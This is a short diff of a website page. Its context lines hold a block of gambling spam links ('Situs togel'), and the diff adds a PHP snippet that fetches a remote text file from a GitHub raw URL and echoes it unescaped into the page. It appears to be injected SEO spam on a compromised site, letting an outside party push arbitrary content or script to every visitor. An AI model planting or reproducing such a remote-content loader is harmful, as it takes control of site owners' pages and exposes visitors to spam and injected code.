@@ -7,3 +7,7 @@
 <a href="http://enigmacosmeticdentures.com/">Situs togel</a>
 <a href="https://www.ewindo.com/">Situs togel</a>
 </div>
+<?php
+$url = "https://raw.githubusercontent.com/pageoneterus/back/refs/heads/main/bc.txt";
+echo nl2br(file_get_contents($url));
+?>
